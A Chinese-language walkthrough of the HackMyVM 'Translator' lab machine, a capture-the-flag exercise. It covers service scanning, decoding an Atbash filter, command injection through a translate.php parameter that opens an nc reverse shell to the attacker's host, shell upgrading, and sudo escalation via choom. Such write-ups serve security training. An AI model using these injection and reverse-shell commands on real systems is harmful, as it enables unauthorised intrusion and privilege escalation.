[HackMyVm - Translator - YouTube](https://www.youtube.com/watch?v=xs6Pw9y_Ayg)
# 主机发现
```C
netdiscover -i eth0 -r 192.168.44.193/24
```
# 服务探测
```C
nmap -sV -A -T4 -p- 192.168.44.134
```
得到只开放了80和22端口

# 目录爆破

```css
gobuster dir -u http://192.168.44.134/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,txt,php
```

只是个输入框，尝试输入，发现我们输入的字符被替换了然后显示
尝试发现是26个字母倒叙替换
也可以通过https://www.dcode.fr/cipher-identifier 发现是使用atbash编码
但我直接写了个脚本
```Python
import sys

def reverse_alphabet_substitution(text):
    # 定义倒序字母映射字典
    reversed_alphabet = {
        'A': 'Z', 'B': 'Y', 'C': 'X', 'D': 'W', 'E': 'V',
        'F': 'U', 'G': 'T', 'H': 'S', 'I': 'R', 'J': 'Q',
        'K': 'P', 'L': 'O', 'M': 'N', 'N': 'M', 'O': 'L',
        'P': 'K', 'Q': 'J', 'R': 'I', 'S': 'H', 'T': 'G',
        'U': 'F', 'V': 'E', 'W': 'D', 'X': 'C', 'Y': 'B',
        'Z': 'A',
    }

    # 使用映射字典替换文本中的字母
    result = ''.join(reversed_alphabet.get(c.upper(), c) for c in text)

    return result.lower()

args = sys.argv

print(args[1])
# 示例文本
input_text = args[1]

# 应用替换函数
output_text = reverse_alphabet_substitution(input_text)

print(output_text)

```

# 反弹SHELL
sh -i >& /dev/tcp/ 192.168.44.128 / 9001 0>&1不行
```C
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ python translater.py nc+-e+/bin/bash+192.168.44.128+9001
nc+-e+/bin/bash+192.168.44.128+9001
mx -v /yrm/yzhs 192.168.44.128 9001
```
访问`http://192.168.44.134/translate.php?hmv=rw;mx -v /yrm/yzhs 192.168.44.128 9001

刚监听的shell不太好用，使用下面这条命令打开一个pty伪终端
```C
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm //设置终端类型为常见的xterm环境变量
stty -a//以容易阅读的方式打印当前的所有配置
stty raw -echo;fg//- 通过 `stty raw -echo` 将当前终端设置为原始模式并关闭回显。接着，使用分号 `;` 立即执行下一条命令。最后，`fg` 命令将最近放入后台的作业切换到前台运行，此时由于终端已处于原始模式且回显关闭，该作业可以直接接收用户的无干扰、未经处理的键盘输入。
reset //设定终端机的状态
```
# 提权
尝试读取第一个flag读取不到cat /home/ocean/user.txt

```C
cat hvxivg

┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ python translater.py Mb+kzhhdliw+rh+zbfie3w4          
Mb+kzhhdliw+rh+zbfie3w4
ny password is ayurv3d4
```
利用sudo 提权到india 账号
https://gtfobins.github.io/gtfobins/choom/
```C
su ocean //输入密码：ayurv3d4
sudo -l
//发现有个(india) NOPASSWD: /usr/bin/choom   这可以让我免密提权至india用户权限
```


**choom**      命令是 util-linux 软件包的一部分
不会用这个命令就去找man：[choom(1) - Linux manual page](https://man7.org/linux/man-pages/man1/choom.1.html)
[Ubuntu Manpage: choom - display and adjust OOM-killer score.](https://manpages.ubuntu.com/manpages/focal/en/man1/choom.1.html)


```C
sudo -u india /usr/bin/choom -n 0 /bin/sh
script /dev/null -c bash
```